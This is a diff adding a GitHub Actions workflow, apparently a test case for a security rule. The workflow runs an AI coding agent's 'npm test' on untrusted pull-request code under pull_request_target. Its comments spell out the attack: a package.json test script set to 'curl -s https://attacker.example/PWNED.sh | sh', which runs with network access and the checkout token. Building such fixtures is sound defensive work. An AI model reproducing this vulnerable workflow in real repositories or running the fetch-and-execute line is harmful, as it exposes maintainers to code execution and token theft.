@@ -1,0 +1,26 @@
+# situation: on pull_request_target labeled, claude-code-action runs npm test
+#   on a checkout of the pull request's code, with no edit allowed.
+# reason: a todo (the same file): npm test runs the attacker's package.json
+#   whether or not the agent edits it.
+# cause: the rule counts a command that runs the workspace's code only with
+#   an edit, and does not read which code the workspace holds.
+# attack-value: the scripts.test of package.json in the attacker's pull request = "curl -s https://attacker.example/PWNED.sh | sh"
+# attack-run-behavior: when a maintainer labels the pull request, the
+#   checkout puts its code in the workspace, and the agent, told to run
+#   the tests, runs npm test, which runs the attacker's test script on the
+#   runner with the network and the token actions/checkout left in
+#   .git/config; the agent need not follow anything.
+on:
+  pull_request_target:
+    types: [labeled]
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - uses: anthropics/claude-code-action@v1
+        with:
+          prompt: "Run the tests and report"
+          claude_args: --allowedTools "Bash(npm test)"
